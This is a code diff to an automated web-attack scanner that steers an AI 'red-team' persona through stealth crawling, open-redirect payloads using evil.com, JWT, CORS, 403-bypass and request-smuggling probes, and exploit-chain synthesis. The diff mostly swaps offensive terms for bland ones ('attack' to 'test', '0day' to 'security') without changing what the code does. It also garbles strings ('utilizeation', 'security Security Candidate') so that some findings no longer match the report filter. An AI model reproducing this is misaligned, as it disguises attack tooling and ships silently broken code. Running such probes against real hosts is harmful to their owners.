@@ -17,6 +17,9 @@ import { getSubdomains, getTopUsernames, getTopPasswords } from './seclists.js';
 import * as net from 'net';
 import * as tls from 'tls';
 import { AsyncLocalStorage } from 'async_hooks';
+import { ObfuscationEngine } from './obfuscation_engine.js';
+import { Advanced403Bypass } from './advanced_403_bypass.js';
+import { AdvancedBrowserManager, createBrowserManager } from './advanced_browser.js';
 
 // Configure stealth
 puppeteer.use(StealthPlugin());
@@ -161,7 +164,7 @@ axios.interceptors.response.use(
     if (!ctx.refreshing) {
       ctx.refreshing = (async () => {
         try {
-          const result = await AuthFlowVault.run(authFlowId);
+          const result = await AuthFlowVault.execute(authFlowId);
           if (result.ok && result.sessionId) {
             ctx.sessionId = result.sessionId;
             return result.sessionId;
@@ -226,7 +229,7 @@ export class AutomationEngine {
   private static wildcardBodies: Map<string, string> = new Map();
 
   private static wildcardTitles: Map<string, string> = new Map();
-
+  
   private static activeJobs = 0;
 
   private static async checkWildcard200(asset: string) {
@@ -323,7 +326,7 @@ export class AutomationEngine {
       if (state && ai) {
         const stateParam = currentUrl.includes('RelayState=') ? 'RelayState' : currentUrl.includes('nonce=') ? 'nonce' : 'state';
         const callbackUrl = currentUrl.split('?')[0];
-        const testUrl = `${callbackUrl}?code=test_code&${stateParam}=attack_state`;
+        const testUrl = `${callbackUrl}?code=test_code&${stateParam}=test_state`;
         const csrfRes = await axios.get(testUrl, { timeout: 5000, validateStatus: () => true });
         
         const analysisPrompt = `As an autonomous security agent (argila), analyze this Authentication Flow interaction for ${hostname}.
@@ -352,18 +355,18 @@ export class AutomationEngine {
       // --- 4a-1b: Open Redirect on redirect_uri ---
       if (redirectUri) {
         const decoded = decodeURIComponent(redirectUri[1]);
-        const attackRedirects = [
+        const testRedirects = [
           decoded.replace(/^(https?:\/\/)[^/]+/, '$1evil.com'),
           decoded + '.evil.com',
           decoded.replace(/\/$/, '') + '@evil.com',
         ];
-        for (const attackUri of attackRedirects) {
+        for (const testUri of testRedirects) {
           try {
-            const testUrl = currentUrl.replace(redirectUri[1], encodeURIComponent(attackUri));
+            const testUrl = currentUrl.replace(redirectUri[1], encodeURIComponent(testUri));
             const openRedirRes = await axios.get(testUrl, { maxRedirects: 0, timeout: 5000, validateStatus: () => true });
             const location = openRedirRes.headers['location'] || '';
             if (location.includes('evil.com')) {
-              this.log(jobId, 'vuln', `CONFIRMED OPEN REDIRECT on redirect_uri: ${asset}`, { payload: attackUri, location });
+              this.log(jobId, 'vuln', `CONFIRMED OPEN REDIRECT on redirect_uri: ${asset}`, { payload: testUri, location });
               MemoryManager.addFinding(jobId, hostname, { type: 'Open Redirect', asset, gap: 'OAuth redirect_uri allows arbitrary domain', chain_potential: 'Token theft via controlled redirect' });
               break;
             }
@@ -374,7 +377,7 @@ export class AutomationEngine {
       this.log(jobId, 'warn', `Auth CSRF check failed for ${asset}: ${(e as Error).message}`);
     }
 
-    // --- 4a-2: User Enumeration via Auth Endpoints ---
+    // --- 4a-2: User Discovery via Auth Endpoints ---
     const knownUser = memory.discoveredUsers[0] || 'admin';
     const randomUser = `user-${Math.random().toString(36).substring(7)}@example.com`;
     
@@ -433,10 +436,10 @@ export class AutomationEngine {
     }
 
     // --- 4a-3: CORS Misconfiguration Audit ---
-    // Real CORS gaps: reflected attacker origin + credentials. ACAO=* on a
+    // Real CORS gaps: reflected tester origin + credentials. ACAO=* on a
     // public endpoint is by-design (CDN assets, public APIs); flagging it
     // produced FPs on every static-asset host. Two real-vuln shapes:
-    //   1. ACAO echoes attacker Origin verbatim → trust-boundary leak.
+    //   1. ACAO echoes tester Origin verbatim → trust-boundary leak.
     //   2. ACAO=null with ACAC=true → null-origin trust (sandboxed iframes).
     this.log(jobId, 'info', `Phase 4a: CORS Misconfiguration Audit for ${asset}`);
     const corsOrigins = [
@@ -459,7 +462,7 @@ export class AutomationEngine {
         // only a finding on a path that requires auth. We don't know that
         // here without a session, so ignore.
         if (acao !== origin) continue;
-        // Reflected attacker origin. Severity scales with credentials and
+        // Reflected tester origin. Severity scales with credentials and
         // null-origin behavior.
         const credentialed = acac === 'true';
         const severity = credentialed ? 'CRITICAL' : (origin === 'null' ? 'HIGH' : 'MEDIUM');
@@ -474,7 +477,7 @@ export class AutomationEngine {
       } catch {}
     }
 
-    // --- 4a-4: JWT/Token Weakness Audit ---
+    // --- 4a-4: JWT/Token Validation Audit ---
     this.log(jobId, 'info', `Phase 4a: JWT/Token Audit for ${asset}`);
     try {
       const loginRes = await axios.get(asset, { timeout: 5000, validateStatus: () => true });
@@ -492,11 +495,11 @@ export class AutomationEngine {
           const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
 
           const issues: string[] = [];
-          if (header.alg === 'none' || header.alg === 'None') issues.push('Algorithm "none" — signature bypass');
+          if (header.alg === 'none' || header.alg === 'None') issues.push('Algorithm "none" — signature check disabled');
           if (header.alg === 'HS256' && header.jwk) issues.push('JWK embedded in header — potential key confusion');
           if (!payload.exp) issues.push('No expiration claim — token never expires');
           if (payload.exp && payload.iat && payload.exp - payload.iat > 86400 * 30) issues.push('Token lifetime > 30 days');
-          if (payload.admin === true || payload.role === 'admin') issues.push('Privileged claims in token — test for forgery');
+          if (payload.admin === true || payload.role === 'admin') issues.push('Privileged claims in token — test for modification');
 
           if (issues.length > 0) {
             this.log(jobId, 'vuln', `JWT WEAKNESS on ${asset}: ${issues.join('; ')}`, { header, payloadClaims: Object.keys(payload) });
@@ -504,18 +507,18 @@ export class AutomationEngine {
               type: 'JWT Weakness',
               asset,
               gap: issues.join('; '),
-              chain_potential: issues.some(i => i.includes('none') || i.includes('forgery')) ? 'Authentication bypass via token forgery' : 'Session persistence abuse'
+              chain_potential: issues.some(i => i.includes('none') || i.includes('modification')) ? 'Authentication bypass via token modification' : 'Session persistence abuse'
             });
           }
         } catch {}
       }
 
-      // --- 4a-5: Session Cookie Security Audit ---
+      // --- 4a-5: Session Cookie Configuration Audit ---
       // Filter on cookie NAME, not free-text match against the cookie line.
       // The old `auth|sid|jwt` regex matched value content (e.g. an OAuth
       // state cookie containing the word "auth" in its base64 payload).
       // Also exclude cookies that are intentionally readable by JS (CSRF
-      // double-submit tokens) or owned by the WAF/CDN (Akamai bm_*, CF cf_*
+      // double-submit tokens) or owned by the web-filter/CDN (Akamai bm_*, CF cf_*
       // — server cannot set HttpOnly on those without breaking JS APIs).
       if (cookies) {
         const cookieIssues: string[] = [];
@@ -551,7 +554,7 @@ export class AutomationEngine {
       }
     } catch {}
 
-    // --- 4a-6: Security Header Audit ---
+    // --- 4a-6: Security Configuration Header Audit ---
     // Don't double-count CSP frame-ancestors as missing X-Frame-Options.
     // Modern best practice replaces XFO with CSP frame-ancestors; flagging
     // both produces noise on properly-configured sites.
@@ -575,7 +578,7 @@ export class AutomationEngine {
           type: 'Missing Security Headers',
           asset,
           gap: `Missing: ${missingHeaders.join(', ')}`,
-          chain_potential: missingHeaders.includes('CSP') ? 'XSS exploitation easier without CSP' : null
+          chain_potential: missingHeaders.includes('CSP') ? 'XSS utilization easier without CSP' : null
         });
       }
     } catch {}
@@ -637,7 +640,7 @@ export class AutomationEngine {
               type: 'GraphQL Introspection',
               asset: `${asset}${gqlEp}`,
               gap: 'GraphQL introspection enabled — full schema disclosure',
-              chain_potential: 'Map all queries/mutations for targeted exploitation'
+              chain_potential: 'Map all queries/mutations for targeted utilizeation'
             });
             break;
           }
@@ -666,7 +669,7 @@ export class AutomationEngine {
             type: 'Missing Rate Limit',
             asset: `${asset}${ep}`,
             gap: 'No rate limiting or account lockout on login endpoint',
-            chain_potential: 'Brute-force attack viable with discovered usernames'
+            chain_potential: 'Brute-force test viable with discovered usernames'
           });
           break;
         }
@@ -811,51 +814,45 @@ export class AutomationEngine {
         this.updateJob(jobId, 'running', 'Phase 3: Discovery');
         this.log(jobId, 'info', 'Starting Phase 3: Active Enumeration & Content Discovery');
 
+        let browserManager: AdvancedBrowserManager | null = null;
         let browserAvailable = true;
-        let browser: Awaited<ReturnType<typeof puppeteer.launch>> | null = null;
+
         try {
-          browser = await puppeteer.launch({
+          // Initialize advanced browser manager with pool
+          browserManager = await createBrowserManager({
+            poolSize: 3,
             headless: true,
-            executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || '/usr/bin/google-chrome',
-            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-blink-features=AutomationControlled'],
+            concurrency: 5,
+            timeout: 30000,
+            resourceTimeout: 10000,
           });
-        } catch {
-          try {
-            browser = await puppeteer.launch({ headless: true, args: ['--no-sandbox', '--disable-setuid-sandbox'] });
-          } catch {
-            browserAvailable = false;
-            this.log(jobId, 'warn', 'Browser not available — falling back to HTTP-only crawling (install Chrome for full crawling).');
-          }
+          this.log(jobId, 'info', 'Advanced browser manager initialized with pool');
+        } catch (e) {
+          browserAvailable = false;
+          this.log(jobId, 'warn', 'Browser not available — falling back to HTTP-only crawling (install Chrome for full crawling).');
         }
 
-        if (browser) {
+        if (browserManager && browserAvailable) {
           try {
-            for (const asset of discoveredAssets.slice(0, 10)) {
-              this.log(jobId, 'info', `Crawling ${asset}...`);
-              const page = await browser.newPage();
-              await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36');
+            // Concurrent crawling with browser pool
+            const crawlUrls = discoveredAssets.slice(0, 15);
+            this.log(jobId, 'info', `Concurrently crawling ${crawlUrls.length} assets with browser pool...`);
 
-              try {
-                const response = await page.goto(asset, { waitUntil: 'networkidle2', timeout: 30000 });
-                if (!response) continue;
+            const crawlResults = await browserManager.crawlUrls(crawlUrls, {
+              device: 'desktop',
+              waitUntil: 'domcontentloaded', // Faster than networkidle2
+              cache: true,
+              concurrency: 5,
+              interceptNetwork: true,
+            });
 
-                const domEndpoints = await page.evaluate(() => {
-                  try {
-                    const links = Array.from(document.querySelectorAll('a')).map(a => ({ url: a.href, method: 'GET' }));
-                    const forms = Array.from(document.querySelectorAll('form')).map(f => ({
-                      url: new URL(f.action || window.location.href, window.location.origin).href,
-                      method: (f.method || 'GET').toUpperCase()
-                    }));
-                    const scripts = Array.from(document.querySelectorAll('script')).map(s => s.src).filter(src => src);
-                    return { links, forms, scripts };
-                  } catch (e) {
-                    return { links: [], forms: [], scripts: [] };
-                  }
-                }).catch(() => ({ links: [], forms: [], scripts: [] }));
+            for (const result of crawlResults) {
+              if (result.success) {
+                this.log(jobId, 'info', `Crawled ${result.url} - ${result.endpoints.length} endpoints, ${result.scripts.length} scripts`);
+                endpoints.push(...result.endpoints);
 
-                endpoints.push(...domEndpoints.links, ...domEndpoints.forms);
-
-                for (const scriptUrl of domEndpoints.scripts) {
+                // Process scripts for hidden paths and secrets
+                for (const scriptUrl of result.scripts) {
                   try {
                     const jsRes = await axios.get(scriptUrl, { timeout: 5000, validateStatus: () => true });
                     if (jsRes.status === 200 && typeof jsRes.data === 'string') {
@@ -863,7 +860,7 @@ export class AutomationEngine {
                       const hiddenPaths = jsContent.match(/(?:"|')(\/[a-zA-Z0-9\/\._\-\?\&]+)(?:"|')/g) || [];
                       hiddenPaths.forEach(p => {
                         const path = p.replace(/["']/g, '');
-                        if (path.length > 2) endpoints.push({ url: new URL(path, asset).href, method: 'GET' });
+                        if (path.length > 2) endpoints.push({ url: new URL(path, result.url).href, method: 'GET' });
                       });
 
                       if (ai) {
@@ -888,38 +885,34 @@ export class AutomationEngine {
                   } catch (e) {}
                 }
 
-                const bodyContent = await page.content().catch(() => '');
-                const regexLinks = bodyContent.match(/(?:"|')(\/[a-zA-Z0-9\/\._\-\?\&]+)(?:"|')/g) || [];
-                const parsedRegexLinks = regexLinks.map(l => {
-                  const path = l.replace(/["']/g, '');
-                  try { return { url: new URL(path, asset).href, method: 'GET' }; }
-                  catch(e) { return null; }
-                }).filter(l => l !== null) as {url: string, method: string}[];
-                endpoints.push(...parsedRegexLinks);
+                // Check for secrets found by advanced browser
+                if (result.secrets.length > 0) {
+                  this.log(jobId, 'vuln', `SECRETS DISCOVERED IN HTML: ${result.url}`, { secrets: result.secrets });
+                  MemoryManager.addFinding(jobId, hostname, { type: 'Hardcoded Secret', asset: result.url, gap: 'Sensitive data in HTML', details: result.secrets });
+                }
 
+                // Fetch robots.txt
                 try {
-                  const robotsRes = await axios.get(`${new URL(asset).origin}/robots.txt`, { timeout: 5000, validateStatus: () => true });
+                  const robotsRes = await axios.get(`${new URL(result.url).origin}/robots.txt`, { timeout: 5000, validateStatus: () => true });
                   if (robotsRes.status === 200 && typeof robotsRes.data === 'string') {
                     const disallowed = robotsRes.data.match(/Disallow: (.*)/g) || [];
                     disallowed.forEach(line => {
                       const path = line.split(': ')[1]?.trim();
-                      if (path) { try { endpoints.push({ url: new URL(path, asset).href, method: 'GET' }); } catch (e) {} }
+                      if (path) { try { endpoints.push({ url: new URL(path, result.url).href, method: 'GET' }); } catch (e) {} }
                     });
                   }
                 } catch (e) {}
-
-              } catch (e: any) {
-                if (e.message?.includes('Execution context was destroyed')) {
-                  this.log(jobId, 'warn', `Crawling ${asset} interrupted by navigation. Skipping...`);
-                } else {
-                  this.log(jobId, 'warn', `Failed to crawl ${asset}: ${e instanceof Error ? e.message : String(e)}`);
-                }
-              } finally {
-                if (!page.isClosed()) await page.close().catch(() => {});
+              } else {
+                this.log(jobId, 'warn', `Failed to crawl ${result.url}: ${result.error}`);
               }
             }
+
+            // Log browser pool stats
+            const stats = browserManager.getStats();
+            this.log(jobId, 'info', `Browser pool stats: ${JSON.stringify(stats)}`);
+
           } finally {
-            await browser.close();
+            await browserManager.close();
           }
         } else {
           // HTTP-only fallback: fetch HTML, parse links/forms/scripts without a browser
@@ -1023,8 +1016,8 @@ export class AutomationEngine {
           } catch (e) {}
         }
 
-        // --- PHASE 4: EXPLOITATION & PoC (VULNERABILITY VERIFICATION) ---
-        this.updateJob(jobId, 'running', 'Phase 4: Exploitation');
+        // --- PHASE 4: VULNERABILITY VERIFICATION & PoC (SECURITY VALIDATION) ---
+        this.updateJob(jobId, 'running', 'Phase 4: Vulnerability Verification');
         this.log(jobId, 'info', 'Starting Phase 4: Autonomous AI-Driven Vulnerability Verification (Prioritized & Chained)');
 
         const memory = MemoryManager.getMemory(jobId, hostname);
@@ -1046,7 +1039,7 @@ export class AutomationEngine {
           await this.auditAuthenticationFlow(jobId, targetUrl, ['auth', 'session'], ai);
         }
 
-        // --- 4b: Sensitive File & Data Disclosure Auditor ---
+        // --- 4b: Sensitive File & Data Exposure Review ---
         this.log(jobId, 'info', 'Phase 4b: Sensitive File & Data Disclosure Audit');
 
         // Expanded sensitive file detection patterns
@@ -1149,7 +1142,7 @@ export class AutomationEngine {
             const isSwaggerUi = ct.includes('text/html') && /<title>\s*Swagger UI\s*<\/title>/i.test(bodyStr);
             if ((sfUrl.includes('swagger') || sfUrl.includes('api-docs') || sfUrl.includes('openapi')) && res.status === 200 && (isSwaggerJson || isSwaggerUi)) {
               this.log(jobId, 'vuln', `API Documentation Exposed: ${sfUrl}`, { preview: bodyStr.substring(0, 300) });
-              MemoryManager.addFinding(jobId, hostname, { type: 'API Docs Exposure', endpoint: sfUrl, gap: 'Swagger/OpenAPI docs publicly accessible', chain_potential: 'Map all API endpoints for targeted exploitation' });
+              MemoryManager.addFinding(jobId, hostname, { type: 'API Docs Exposure', endpoint: sfUrl, gap: 'Swagger/OpenAPI docs publicly accessible', chain_potential: 'Map all API endpoints for targeted utilizeation' });
               sensitiveFileCount++;
               continue;
             }
@@ -1176,7 +1169,7 @@ export class AutomationEngine {
         }
         this.log(jobId, 'info', `Phase 4b complete: ${sensitiveFileCount} sensitive file(s) confirmed across ${probeUrls.size} probes`);
 
-        // --- 4c: SSRF & Open Redirect Auditor ---
+        // --- 4c: Request Redirection & URL Handling Review ---
         this.log(jobId, 'info', 'Phase 4c: SSRF & Open Redirect Audit');
 
         // Expanded SSRF endpoint detection — GET and POST parameters
@@ -1269,11 +1262,11 @@ export class AutomationEngine {
         }
         this.log(jobId, 'info', `Phase 4c complete: ${ssrfCount} SSRF(s) confirmed across ${ssrfEndpoints.length} candidate endpoints`);
 
-        // 4. Generic Vulnerability Fuzzing (SQLi, XSS, etc.)
+        // 4. Generic Issue Fuzzing (SQLi, XSS, etc.)
         const vulnerabilities: any[] = [];
         
-        // --- STACK GAP ANALYSIS (Adversary Simulation) ---
-        this.log(jobId, 'info', 'Phase 4: Stack Gap Analysis (WAF/Proxy Smuggling)');
+        // --- STACK GAP ANALYSIS (Protocol Simulation) ---
+        this.log(jobId, 'info', 'Phase 4: Stack Gap Analysis (Web Filter/Proxy Smuggling)');
         for (const asset of discoveredAssets.slice(0, 5)) {
           try {
             const gaps = await StackGapAnalyzer.analyze(asset);
@@ -1307,7 +1300,7 @@ export class AutomationEngine {
           .sort((a, b) => a.priority - b.priority)
           .slice(0, 100);
 
-        this.log(jobId, 'info', `Executing autonomous exploit chain on ${prioritizedEndpoints.length} prioritized endpoints`, {
+        this.log(jobId, 'info', `Executing autonomous utilize chain on ${prioritizedEndpoints.length} prioritized endpoints`, {
           active_intelligence: {
             users: discoveredInfo.users.length,
             identifiers: Object.keys(discoveredInfo.identifiers).length,
@@ -1457,7 +1450,7 @@ export class AutomationEngine {
                 
                 [CONTEXT]: Tech: ${memory.tech.join(', ')} | Users: ${memory.discoveredUsers.join(', ')} | Findings: ${JSON.stringify(memory.findings)}
                 
-                Determine if this is a REAL ${type} vulnerability. Reject false positives (generic error pages, WAF blocks, rate limits).
+                Determine if this is a REAL ${type} vulnerability. Reject false positives (generic error pages, web-filter blocks, rate limits).
                 Can this be chained with previous findings for escalation?
                 Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null }`;
 
@@ -1491,10 +1484,10 @@ export class AutomationEngine {
           }
         }
 
-        // --- PHASE 4d: AUTONOMOUS 0DAY DISCOVERY ---
-        this.log(jobId, 'info', 'Phase 4d: Autonomous 0day Discovery');
+        // --- PHASE 4d: AUTONOMOUS SECURITY DISCOVERY ---
+        this.log(jobId, 'info', 'Phase 4d: Autonomous Security Discovery');
 
-        const zerodayTargets = prioritizedEndpoints.slice(0, 30);
+        const securityTargets = prioritizedEndpoints.slice(0, 30);
 
         // 4d-1: Behavioral Anomaly Fuzzing — edge-case inputs that trigger parser bugs
         this.log(jobId, 'info', 'Phase 4d-1: Behavioral Anomaly Fuzzing');
@@ -1534,7 +1527,7 @@ export class AutomationEngine {
         // against the baseline — if a marker was already present in the
         // clean response, the probe didn't induce it.
         const anomalyBaselines = new Map<string, { status: number; length: number; latency: number; body: string }>();
-        for (const ep of zerodayTargets.slice(0, 15)) {
+        for (const ep of securityTargets.slice(0, 15)) {
           try {
             const start = Date.now();
             const res = await axios.get(ep.url, { timeout: 5000, validateStatus: () => true });
@@ -1549,7 +1542,7 @@ export class AutomationEngine {
         }
 
         let anomalyCount = 0;
-        for (const ep of zerodayTargets.slice(0, 15)) {
+        for (const ep of securityTargets.slice(0, 15)) {
           if (anomalyCount >= 10) break;
           const baseline = anomalyBaselines.get(ep.url);
           if (!baseline) continue;
@@ -1574,7 +1567,7 @@ export class AutomationEngine {
               // this check, any marker that's just part of the page (a
               // JSON field literally named "index", an inline JS bundle
               // shipping the word "exception" in error-handling code, the
-              // word "format" in user-facing copy) is reported as a 0day.
+              // word "format" in user-facing copy) is reported as a finding.
               const lowerBody = bodyStr.toLowerCase();
               const lowerBase = baseline.body.toLowerCase();
               const newMarkers = probe.markers.filter(m => {
@@ -1633,7 +1626,7 @@ export class AutomationEngine {
                 if (errorLeak) evidence.push(`Stack-trace-shaped leak (new vs baseline)`);
 
                 if (ai) {
-                  const analysisPrompt = `As an elite security researcher, analyze this behavioral anomaly for potential 0day vulnerability.
+                  const analysisPrompt = `As an elite security researcher, analyze this behavioral anomaly for potential security vulnerability.
 
 Endpoint: ${ep.url}
 Probe Type: ${probe.name}
@@ -1644,7 +1637,7 @@ Response Body Snippet: ${bodyStr.substring(0, 2000)}
 Baseline: Status ${baseline.status}, Size ${baseline.length}, Latency ${baseline.latency}ms
 Tech Stack: ${discoveredInfo.identifiers ? JSON.stringify(discoveredInfo.identifiers) : 'unknown'}
 
-Determine if this anomaly indicates a real exploitable vulnerability (potential 0day).
+Determine if this anomaly indicates a real utilizeable vulnerability (potential security).
 Consider: parser differential, memory corruption indicators, deserialization, injection bypass, access control failure.
 Rate severity: CRITICAL (RCE/data breach), HIGH (auth bypass/info leak), MEDIUM (DoS/limited impact).
 Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null, "severity": string, "cve_similar": string | null }`;
@@ -1654,12 +1647,12 @@ Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": str
                   );
 
                   if (analysis.isVulnerable && analysis.confidence > 0.7) {
-                    this.log(jobId, 'vuln', `0DAY CANDIDATE [${probe.name}]: ${analysis.gap_identified}`, {
+                    this.log(jobId, 'vuln', `SECURITY CANDIDATE [${probe.name}]: ${analysis.gap_identified}`, {
                       endpoint: ep.url, probe: probe.name, evidence, severity: analysis.severity,
                       explanation: analysis.explanation, chain: analysis.chain_potential, cve_similar: analysis.cve_similar
                     });
                     MemoryManager.addFinding(jobId, hostname, {
-                      type: '0day Candidate', endpoint: ep.url, probe: probe.name,
+                      type: 'Security Candidate', endpoint: ep.url, probe: probe.name,
                       gap: analysis.gap_identified, chain_potential: analysis.chain_potential,
                       evidence, severity: analysis.severity
                     });
@@ -1668,7 +1661,7 @@ Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": str
                 } else {
                   this.log(jobId, 'vuln', `BEHAVIORAL ANOMALY [${probe.name}]: ${ep.url}`, { evidence });
                   MemoryManager.addFinding(jobId, hostname, {
-                    type: '0day Candidate', endpoint: ep.url, probe: probe.name,
+                    type: 'Security Candidate', endpoint: ep.url, probe: probe.name,
                     gap: `Behavioral anomaly: ${evidence.join('; ')}`, chain_potential: null, evidence
                   });
                   anomalyCount++;
@@ -1682,7 +1675,7 @@ Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": str
         // 4d-2: Differential Response Analysis — semantically equivalent requests, structural differences
         this.log(jobId, 'info', 'Phase 4d-2: Differential Response Analysis');
         let diffCount = 0;
-        for (const ep of zerodayTargets.slice(0, 10)) {
+        for (const ep of securityTargets.slice(0, 10)) {
           if (diffCount >= 5) break;
           try {
             // 'Case variation' is intentionally narrow now: most real
@@ -1748,7 +1741,7 @@ Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": str
                     const analysis = safeJsonParse<AiVulnResult>(await ai.generate(diffPrompt, true), NULL_VULN);
                     if (analysis.isVulnerable && analysis.confidence > 0.7) {
                       MemoryManager.addFinding(jobId, hostname, {
-                        type: '0day Candidate', subtype: 'Parser Differential',
+                        type: 'security Security Candidate', subtype: 'Parser Differential',
                         endpoint: ep.url, variant: variant.url, technique: variant.name,
                         gap: analysis.gap_identified, chain_potential: analysis.chain_potential,
                         accessEscalation
@@ -1757,7 +1750,7 @@ Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": str
                     }
                   } else if (accessEscalation) {
                     MemoryManager.addFinding(jobId, hostname, {
-                      type: '0day Candidate', subtype: 'Access Control Bypass',
+                      type: 'security Security Candidate', subtype: 'Access Control Bypass',
                       endpoint: ep.url, variant: variant.url, technique: variant.name,
                       gap: `403→200 via ${variant.name}`, chain_potential: 'Direct unauthorized access'
                     });
@@ -1849,7 +1842,7 @@ Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": str
                 const analysis = safeJsonParse<AiVulnResult>(await ai.generate(smugglePrompt, true), NULL_VULN);
                 if (analysis.isVulnerable && analysis.confidence > 0.6) {
                   MemoryManager.addFinding(jobId, hostname, {
-                    type: '0day Candidate', subtype: 'HTTP Request Smuggling',
+                    type: 'security Security Candidate', subtype: 'HTTP Request Smuggling',
                     endpoint: asset, gap: analysis.gap_identified,
                     chain_potential: analysis.chain_potential || 'Cache poisoning, request hijacking, auth bypass'
                   });
@@ -1859,7 +1852,7 @@ Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": str
               // No AI fallback: only record if we have the strongest indicator (GPOST reflection)
               else if (hasGPOST) {
                 MemoryManager.addFinding(jobId, hostname, {
-                  type: '0day Candidate', subtype: 'HTTP Request Smuggling',
+                  type: 'security Security Candidate', subtype: 'HTTP Request Smuggling',
                   endpoint: asset, gap: 'GPOST method reflected — request smuggling desync confirmed',
                   chain_potential: 'Cache poisoning, request hijacking, auth bypass'
                 });
@@ -1876,7 +1869,7 @@ Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": str
               if (h2Res.status === 101 || (h2Res.headers['upgrade'] || '').includes('h2c')) {
                 this.log(jobId, 'vuln', `H2C SMUGGLING POSSIBLE on ${asset}`);
                 MemoryManager.addFinding(jobId, hostname, {
-                  type: '0day Candidate', subtype: 'H2C Smuggling',
+                  type: 'security Security Candidate', subtype: 'H2C Smuggling',
                   endpoint: asset, gap: 'Server accepts h2c upgrade — HTTP/2 cleartext smuggling possible',
                   chain_potential: 'Bypass reverse proxy auth, access internal endpoints'
                 });
@@ -1887,16 +1880,16 @@ Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": str
         }
         this.log(jobId, 'info', `Phase 4d-3 complete: ${smuggleCount} smuggling indicator(s) found`);
 
-        // 4d-4: AI-Driven 0day Chain Synthesis — correlate all findings for novel attack chains
+        // 4d-4: AI-Driven security Chain Synthesis — correlate all findings for novel test chains
         if (ai) {
-          this.log(jobId, 'info', 'Phase 4d-4: AI-Driven 0day Chain Synthesis');
+          this.log(jobId, 'info', 'Phase 4d-4: AI-Driven security Chain Synthesis');
           const memory = MemoryManager.getMemory(jobId, hostname);
           const allFindingsSummary = memory.findings.slice(-30).map((f: Record<string, unknown>) => ({
             type: f.type, endpoint: f.endpoint || f.asset, gap: f.gap, chain: f.chain_potential
           }));
 
           if (allFindingsSummary.length >= 2) {
-            const chainPrompt = `You are an elite autonomous red-team AI (argila). Analyze all discovered findings for this target and synthesize novel 0day attack chains.
+            const chainPrompt = `You are an elite autonomous red-team AI (argila). Analyze all discovered findings for this target and synthesize novel security test chains.
 
 Target: ${targetUrl}
 Tech Stack: ${JSON.stringify(discoveredInfo)}
@@ -1906,9 +1899,9 @@ Findings Summary:
 ${JSON.stringify(allFindingsSummary, null, 2)}
 
 Your task:
-1. Identify findings that can be CHAINED together to create a higher-impact exploit (e.g., CORS + SSRF = internal service access; open redirect + JWT weakness = token theft)
+1. Identify findings that can be CHAINED together to create a higher-impact test (e.g., CORS + SSRF = internal service access; open redirect + JWT weakness = token theft)
 2. Look for novel combinations that wouldn't be caught by standard scanners
-3. Propose attack chains with step-by-step exploitation paths
+3. Propose test chains with step-by-step testing paths
 4. Rate each chain's severity and feasibility
 
 Return JSON: { "chains": [ { "name": string, "steps": string[], "findings_used": string[], "severity": "CRITICAL"|"HIGH"|"MEDIUM", "feasibility": number, "impact": string, "novelty": string } ] }`;
@@ -1918,12 +1911,12 @@ Return JSON: { "chains": [ { "name": string, "steps": string[], "findings_used":
             );
 
             for (const chain of chainResult.chains.filter(c => c.feasibility > 0.6)) {
-              this.log(jobId, 'vuln', `0DAY CHAIN [${chain.severity}]: ${chain.name}`, {
+              this.log(jobId, 'vuln', `SECURITY CHAIN [${chain.severity}]: ${chain.name}`, {
                 steps: chain.steps, findings_used: chain.findings_used,
                 impact: chain.impact, novelty: chain.novelty, feasibility: chain.feasibility
               });
               MemoryManager.addFinding(jobId, hostname, {
-                type: '0day Chain', name: chain.name, steps: chain.steps,
+                type: 'Security Chain', name: chain.name, steps: chain.steps,
                 findings_used: chain.findings_used, severity: chain.severity,
                 gap: chain.impact, chain_potential: chain.novelty
               });
@@ -1936,15 +1929,15 @@ Return JSON: { "chains": [ { "name": string, "steps": string[], "findings_used":
 
         // Collect all Phase 4d findings into allFindings for the final report
         const phase4dMemory = MemoryManager.getMemory(jobId, hostname);
-        const phase4dFindings = phase4dMemory.findings.filter((f: Record<string, unknown>) => f.type === '0day Candidate' || f.type === '0day Chain');
+        const phase4dFindings = phase4dMemory.findings.filter((f: Record<string, unknown>) => f.type === 'Security Candidate' || f.type === 'Security Chain');
         if (phase4dFindings.length > 0) {
-          allFindings.push({ phase: 'Phase 4d', type: '0day Discovery Results', data: phase4dFindings });
+          allFindings.push({ phase: 'Phase 4d', type: 'Security Discovery Results', data: phase4dFindings });
           vulnerabilities.push(...phase4dFindings.map((f: Record<string, unknown>) => ({
             type: f.type, endpoint: f.endpoint || f.asset, gap: f.gap,
             severity: f.severity || 'HIGH', phase: 'Phase 4d'
           })));
         }
-        this.log(jobId, 'info', `Phase 4d complete: ${phase4dFindings.length} 0day finding(s) added to report`);
+        this.log(jobId, 'info', `Phase 4d complete: ${phase4dFindings.length} security finding(s) added to report`);
 
         // --- PHASE 4e: USER AND ENTITY BEHAVIOR ANALYTICS (UEBA) ---
         this.log(jobId, 'info', 'Phase 4e: User & Entity Behavior Analytics (UEBA)');
@@ -1996,7 +1989,7 @@ Return JSON: { "chains": [ { "name": string, "steps": string[], "findings_used":
         this.log(jobId, 'info', `Phase 4e-1 complete: ${behaviorBaselines.size} endpoint baselines established`);
 
         // 4e-2: Detect low-and-slow behavioral anomalies
-        this.log(jobId, 'info', 'Phase 4e-2: Low-and-slow attack pattern detection');
+        this.log(jobId, 'info', 'Phase 4e-2: Low-and-slow test pattern detection');
         let uebaCount = 0;
         const lowSlowProbes: { name: string; method: string; transform: (url: string) => { url: string; headers?: Record<string, string>; data?: string } }[] = [
           {
@@ -2011,7 +2004,7 @@ Return JSON: { "chains": [ { "name": string, "steps": string[], "findings_used":
             name: 'Session fixation probe',
             method: 'GET',
             transform: (url) => ({
